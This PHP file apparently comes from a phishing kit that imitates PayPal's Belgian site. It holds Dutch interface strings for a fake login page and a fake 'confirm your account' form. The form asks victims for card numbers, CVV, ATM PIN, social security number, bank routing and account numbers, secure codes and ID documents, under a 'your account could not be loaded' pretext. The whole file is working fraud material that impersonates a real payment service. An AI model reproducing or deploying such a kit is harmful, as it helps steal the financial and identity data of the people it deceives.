<?php  
$confirmbutton = "bevestigen";
$confirmyourinfo = "You need to confirm your informations to be able to fix this problem and access to your account";
$unabletoload = "Tijdelijk niet in staat om uw account te laden.";

$copy1 = "Copyright © 1999-".$copyright." ";
$copy2 = "Alle rechten voorbehouden.";
$wrong = "Sommige u ingevoerde informatie is niet correct.";
$titlerr = "Fout: Login ";
$confirm = "Bevestig uw Account Gebruik het zoals u wilt";
$topp = "Uw veiligheid is onze topprioriteit";
$secondarycred = "Secundaire Credit Card (optioneel)";
$primarycred = "Primaire Credit Card";
$thiscardis = "Deze Kaart is VBV / MSC";

$page="nl_BE";
$section_n1 = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_ = true;
$section_row_fluid_panel_blue_reverseLink = true;
$section_row_fluid_editorial_editorial_left_ = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n4_ = false;
$section_row_fluid_panel_light_center_text = true;
$top_title = "Veilig online betalen of betaald worden - PayPal ".ucfirst($_SESSION['country_name']);
$small_with_helper_input_0 = "Vul een geldig e-mailadres in";
$small_with_helper_input_1 = "Vul een wachtwoord in.";
$login_email_input_0 = "E-mailadres";
$passwordRecovery1_a_0 = "E-mailadres vergeten?";
$login_password_input_0 = "Wachtwoord";
$passwordRecovery2_a_0 = "Wachtwoord vergeten?";
$login_button_a_0 = "Inloggen";
$signup_button_a_0 = "Aanmelden";
$header_buy_a_0 = "Kopen";
$header_sell_a_0 = "Verkopen";
$header_send_a_0 = "Geld overmaken";
$copy1 = "Copyright © 1999-".$copyright." ";
$copy2 = " Alle rechten voorbehouden.";
$header_business_a_0 = "Zakelijk";
$signup_button_inner_a_0 = "Aanmelden";
$hero_h1_0 = "Veilig. Simpel. Online shoppen en betalen.";
$SignUp_consumer_hero_input_0 = "Open een gratis rekening";
$signup_subline_p_0 = "";
$icon_help_a_0 = "Hulp";
$icon_contact_a_0 = "Contact";
$icon_search_button_0 = "Zoeken";
$_large_h2_n1_0 = "Altijd uw geld bij de hand";
$_large_h2_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "Veilig online winkelen";
$_large_h2_row_fluid_editorial_editorial_left__0 = "Accepteer voortaan alles.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_0 = "Grenzeloze betaalmogelijkheden.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_1 = "Handje contantje, maar dan online.";
$contentPara_p_n1_0 = "Klanten maken graag gebruik van PayPal omdat het gemakkelijk is. Betalen is slechts een kwestie van uw e-mailadres en wachtwoord invullen. ";
$contentPara_p_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "Met PayPal kunt u zorgeloos shoppen. Als uw aankoop niet wordt geleverd of niet op de omschrijving in de advertentie lijkt, kunt u uw geld terug krijgen. ";
$contentPara_p_row_fluid_panel_blue_reverseLink_0 = "Maak eenvoudig geld over naar iedereen met een e-mailadres, waar ook ter wereld. En geld sturen vanaf uw bankrekening is nog helemaal gratis ook! ";
$contentPara_p_row_fluid_panel_blue_reverseLink_1 = "Een betaalverzoek is een simpele manier om mensen eraan te herinneren dat u nog geld van ze krijgt. De ontvanger kan op elke gewenste manier betalen. ";
$contentPara_p_row_fluid_editorial_editorial_left__0 = "PayPal zorgt dat u in een oogwenk online betalingen via krediet- of debetkaart of het PayPal-saldo kunt ontvangen. En het sturen van een factuur is ook eenvoudig. Zo houdt u tijd over voor andere zaken. ";
$contentLink_a_n1_0 = "Betaal online";
$contentLink_a_n1_1 = "Betaal op eBay";
$contentLink_a_row_fluid_panel_blue_reverseLink_0 = "Geld overmaken";
$contentLink_a_row_fluid_panel_blue_reverseLink_1 = "Doe een betaalverzoek";
$contentLink_a_row_fluid_editorial_editorial_left__0 = "Betalingen ontvangen op uw website";
$contentLink_a_row_fluid_editorial_editorial_left__1 = "E-mailbetalingen";
$contentLink_reverseLink_a_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "PayPal Aankoopbescherming";
$contentLink_reverseLink_a_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__1 = "";
$closingHeadline_headline_large_p_0 = "Maak het uw geld gemakkelijk. ";
$btn_closing_cta_center_block_span4_a_0 = "Ga naar PayPal Shopping";
$footer_footer_main_secondaryLink_li = array();
$footer_footer_main_secondaryLink_li[0] = "Hulp";
$footer_footer_main_secondaryLink_li[1] = "Contact";
$footer_footer_main_secondaryLink_li[2] = "Kosten";
$footer_footer_main_secondaryLink_li[3] = "Veiligheid";
$footer_footer_main_secondaryLink_li[4] = "Apps";
$footer_footer_main_secondaryLink_li[5] = "Shopping";
$footer_footer_secondary_secondaryLink_li = array();
$footer_footer_secondary_secondaryLink_li[0] = "Over ons";
$footer_footer_secondary_secondaryLink_li[1] = "Vacatures";
$footer_footer_secondary_secondaryLink_li[2] = "eBay";
$footer_footer_secondary_secondaryLink_li[3] = "Developers";
$footer_footer_secondary_secondaryLink_li[4] = "Partners";
$footer_footer_secondary_secondaryLink_li[5] = "Feedback";
$footer_footer_tertiary_secondaryLink_li = array();
$footer_footer_tertiary_secondaryLink_li[0] = "Copyright © 1999 - ".$copyright." PayPal. Alle rechten voorbehouden.";
$footer_footer_tertiary_secondaryLink_li[1] = "Privacy";
$footer_footer_tertiary_secondaryLink_li[2] = "Juridisch";

$top_title2 = "Fout - InloggenBelgië - PayPal";
$alert_alert_warning_div_0 = "U dient zowel uw e-mailadres als uw wachtwoord in te voeren. Probeer het opnieuw.";
$loginheadline_p_0 = "Log in op uw rekening";
$error_span_0 = "E-mailadres";
$error_span_1 = "Wachtwoord";
$btn_large_input_0 = "Inloggen";
$pwrLinkoldflow_a_0 = "Uw e-mailadres of wachtwoord vergeten?";
$btn_btn_secondary_large_a_0 = "Een gratis rekening openen";
$headline_p_0 = "Alles-in-één-betaaloplossing<SPAN class=headline-content>Gebruik uw creditcard, bankrekening of PayPal-saldo.Het is uw geld, dus u bepaalt hoe u het uitgeeft.</SPAN>";
$headline_p_1 = "Eenvoudig. En meestal gratis.<SPAN class=headline-content>Een PayPal-rekening openen is gratis en u betaalt geen transactiekosten als u iets koopt, ongeacht de gebruikte betaalmethode.</SPAN>";
$footer_li_footer_li = array();
$footer_li_footer_li[0] = "Info";
$footer_li_footer_li[1] = "Rekeningtypen";
$footer_li_footer_li[2] = "Kosten";
$footer_li_footer_li[3] = "Privacy";
$footer_li_footer_li[4] = "Veilig handelen";
$footer_li_footer_li[5] = "Contact met ons opnemen";
$footer_li_footer_li[6] = "Juridische overeenkomsten";
$footer_li_footer_li[7] = "Vacatures";
$footer_li_footer_li[8] = "Bulkbetaling";
$legal_p_0 = "Copyright © 1999-".$copyright." PayPal. Alle rechten voorbehouden.";

$charset = "iso-8859-1";
$profupdate = "Profiel Bijwerken - PayPal";
$processing = "Logging u veilig";
$opay = 'Logboekregistratie in - PayPal';
$ifno = "als deze pagina wordt weergegeven voor meer dan 5 seconden";
$clickhere = 'Klik hier';
$reload = "om te laden.";
$logout = "Uitloggen";
$help = "Help";
$s_center = "Veilig handelen";
$myacc = "Mijn Account";
$over = "Overzicht";
$addfound = "Toevoegen fondsen";
$retirar = "Trekken";
$banktf = "Overdracht naar bankrekening";
$history = "Geschiedenis";
$bsearch = "Eenvoudig zoeken";
$dhistory = "Download geschiedenis";
$resolu = "Resolutie Centre";
$opencase = "Bekijk openstaande meldingen";
$guides = "Gidsen";
$prof = "Profiel";
$addemail = "Voeg toe of bewerk E-mail";
$addbank = "Toevoegen of bewerken van bankrekening";
$addcard = "Toevoegen of bewerken van Credit kaart";
$addadr = "Toevoegen of bewerken van postadres";
$sendmoney = "Verzend geld";
$reqmoney = "Verzoek geld";
$mservices = 'Merchant Services';
$autools = "Veiling Tools";
$stra = "Veilige transactie";
$puf = "Profiel bijwerken";
$pip = "Persoonlijke informatie profiel";
$acu = "Voer uw informatie zo nauwkeurig mogelijk.";
$accu = "Controleer of u de gegevens nauwkeurig, en volgens de formaten vereist invoeren.";
$filla = "Vul alle vereiste velden in.";
$rfield = 'Verplicht veld';
$ffPrenom = "voornaam";
$ffNom = "Achternaam";
$dateness = "datum van geboorte";
$month = "Maand";
$day = "Dag";
$year = "Jaar";
$adr1 = "adres regel 1";
$adr2 = "adres regel 2";
$city = "stad";
$state = "staat";
$zip = "Postcode";
$country = "land";
$scountry = "--Selecteer land--";
$hpn = "telefoonnummer thuis";
$acpnum = "dit nummer zal worden gebruikt om contact met u opnemen over veiligheidsmaatregelen en/of andere kwesties met betrekking tot uw PayPal-account.";
$ccprof = "Credit/Debet kaart profiel";
$damelacc = "Voer de gegevens zo nauwkeurig mogelijk.";
$damelacb = "om card nummer, kunt u nummers opgeven only please, geen streepjes of ruimten.";
$Nomdutitulairedelacarte = "kaart Naam";
$ccnumbr = "kaart nummer";
$expbr = "verloopdatum";
$cvv = "kaart verificatienummer";
$hcvv = "Help het vinden van uw kaartverificatienummer";
$atmm = "uw ATM PIN";
$ssn = "sofi-nummer";
$routing = "Bank Routing Number";
$account = "Bank Account Number";
$hrouting = "Help vinden van uw Bank routering nummer";
$haccount = "Help vinden van uw bankrekeningnummer";
$codepersonel = "secure code";
$IDTYPE = "Selecteer type Id";
$Passport = "Paspoort";
$Card_Identification = "Kaart van identificatie";
$Driving_License = "Rijbewijs";
$for1 = "Voor uw bescherming, we Controleer credit card informatie.";
$for2 = "het proces duurt gewoonlijk ongeveer 30 seconden, maar het kan langer duren tijdens bepaalde periodes van de dag. Klik ";
$for3 = "als u wilt het bijwerken van uw gegevens.";
$spo = "Bewaar profiel";
$t1 = "Meer informatie";
$t2 = "over ons";
$t3 = "Website Feedback";
$t4 = "Fees";
$t5 = "Privacy";
$t6 = "Beveiligingscentrum";
$t7 = "Contacteer ons";
$t8 = "Wettelijke overeenkomsten";
$t9 = "Wereldwijd";
$t10 = "Jobs";
$t11 = 'Merchant Services';
$t12 = "Onze Blog";
$t13 = "Labs";
$t14 = "Verwijzingen";
$t15 = "Site Map";
$t16 = 'eBay';
$t17 = "Gemeenschap";
$fdic = "Informatie over Pass Through-verzekering van de FDIC";
$myvar3 = "Vul het onderstaande formulier om uw profielgegevens bijwerken en de toegang tot uw account herstellen.";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">'.$myvar3.'</p></div></div>';

$valid = array(
"Voer uw voornaam"
, "Ongeldige voornaam"
, "Voer uw achternaam"
, "Ongeldige achternaam"
, "Selecteer een geldige geboorte maand. "
, "Selecteer een geldige verjaardag. "
, "Selecteer een geldige geboortejaar. "
, "Voer uw adres"
, "Ongeldig adres"
, "Ongeldig adres"
, "Voer de naam van uw stad"
, "Voer een geldige naam van de stad. "
, "Voer een geldige naam van de stad. "
, "Selecteer land / gebied"
, "Voer uw ZIP-code"
, "Ongeldige postcode. "
, "Voer uw telefoonnummer"
, "Geef alleen het nummer"
, "Voer een geldig telefoonnummer"
, "Voer een geldige naam van kaarthouder"
, "Card nummer is in een ongeldig formaat"
, "Credit cardnummer is ongeldig"
,""
,""
, "Geef alleen het nummer"
, "Selecteer de vervaldatum--maand--"
, "Selecteer de vervaldatum--jaar--"
, "Voer uw Cvv"
, "Voer een geldig Cvv/Cvv2 voor uw kaart. "
, "Ongeldige Cvv/Cvv2"
, "Voer uw ATM PIN"
, "Voer een geldig ATM PIN"
, "Voer een geldig ATM PIN"
, "Voer uw sofi-nummer"
, "Ongeldig sofi-nummer. "
, "Ongeldig sofi-nummer. "
, "De sociale zekerheid nummer alleen het nummer"
, "Voer uw Secure Code"
,"Ongeldige veilige Code");
$allcountry1 = "Wij begrijpen waar u vandaan komt.";
$allcountry2 = "PayPal is in 193 landen en in 26 verschillende valuta's beschikbaar. Het maakt niet uit waar u vandaan komt, we zijn u grenzeloos van dienst zodat u veilig wereldwijd kunt betalen of betalingen kunt ontvangen. ";
$One_moment = "Een moment...";


$your_money = "Haal meer uit uw geld";
$your_money_p = "Uw PayPal-rekening geeft je een veiliger, sneller en handige manier om online en op je mobiel te betalen. Bewaar uw financiële gegevens veilig bij ons uw account gebruiken om te winkelen, geld overmaken of uw spullen te verkopen om wat extra geld te verdienen - allemaal in slechts een paar klikken.";
$websites = "Winkelen op miljoenen websites";
$websites_p = "PayPal is beschikbaar in de miljoenen websites over de hele wereld. Dus of u nu kopen van de grootste retailers of de kleinste specialisten, kunt u winkelen zonder het delen van uw gegevens en de snelheid door de kassa. En welk apparaat je gebruikt, zal uw PayPal-ervaring net zo snel en handig.";
$Simply_secure = "gewoon veilig";
$Simply_secure_p = "Veiligheid is de kern van alles wat we doen. Of het beschermen van uw financiële gegevens of uw aankopen, zetten we eerst uw veiligheid en gemoedsrust. Daarom gebruiken we toonaangevende encryptie en anti-fraude-technologie, waarom we controleren transacties 24 uur per dag en waarom wij kunnen u helpen om uw geld terug als uw aankoop niet aankomen of niet overeenkomt met de beschrijving.";
$ex_date_info = "Geef ons uw kaart vervaldatum (MM / YYYY).";
$ex_date_empty = "Geef ons uw kaart vervaldatum.";
$ex_date_format = "Vul een geldige vervaldatum (MM / YYYY).";
$cardholder_info = "Gebruik uw naam zoals vermeld op uw kaart";
$card_info = "Voer uw kaartnummer";
$card_format = "Kaartnummer is ongeldig";
$atm_info = "Voer de atm pin voor deze kaart.";
$account_info = "Voer uw bankrekeningnummer";
$account_empty = "Vul uw bankrekeningnummer om uw account te verifiëren";
$account_format = "Vul een geldig bankrekeningnummer";
$routing_info = "Voer uw banknummer";
$routing_empty = "Vul uw banknummer om uw account te verifiëren";
$routing_format = "Vul een geldig banknummer";
$first_name = "Uw voornaam";
$first_name_info = "Gebruik je officiële voornaam zoals vermeld op uw rijbewijs, sofi-kaart of paspoort.";
$first_name_empty = "We hebben uw wettelijke voornaam om uw account te verifiëren.";
$last_name = "Uw achternaam";
$last_name_info = "Gebruik uw wettelijke achternaam zoals vermeld op uw rijbewijs, sofi-kaart of paspoort.";
$last_name_empty = "We hebben uw wettelijke achternaam om uw account te verifiëren.";
$Birth_date = "Geboortedatum";
$Birth_date_empty ="Geef ons uw geboortedatum.";
$Birth_date_format = "Vul een geldige datum (DD / MM / YYYY).";
$Birth_date_info = "Geef ons uw geboortedatum (DD / MM / YYYY).";
$Address1 = "Adresregel 1";
$Address1_empty = "We hebben een geldig adres om uw account te verifiëren.";
$Address1_info = "We kunnen niet accepteren postbussen of zakelijke adressen.";
$Address2 = "Adresregel 2";
$City = "stad";
$City_empty = "We hebben behoefte aan een dorp / stad om je account te verifiëren.";
$Postcode = "Postcode";
$Postcode_empty = "We moeten een postcode invoeren om een nieuwe account aan te maken voor je.";
$Postcode_format = "Controleer uw postcode voor typefouten, doet het formaat er niet goed uit.";
$fone = "Uw telefoonnummer";
$fone_empty = "We hebben uw telefoonnummer aan uw account te verifiëren.";
$fone_format = "Gelieve uw telefoonnummer voor typefouten, doet het formaat er niet goed uit.";
$fone_info = "Uw telefoonnummer (neem alleen cijfers)";
$verifyaccount = "Controleer uw account";
$Ownb = "Een eigen bedrijf?";
$hh1 = "Uw beveiligde gegevens";
$hh2 = "Uw persoonlijke gegevens";
$pp1 = "We hebben uw geldige beveiligde gegevens in om uw account te verifiëren.";
$pp2 = "We hebben wat informatie over u voordat wij uw account kunnen verifiëren.";

$type1="thuis";
$type2="Mobile";
$button_continue="Doorgaan";
$button_validate="Verifiëren";
?>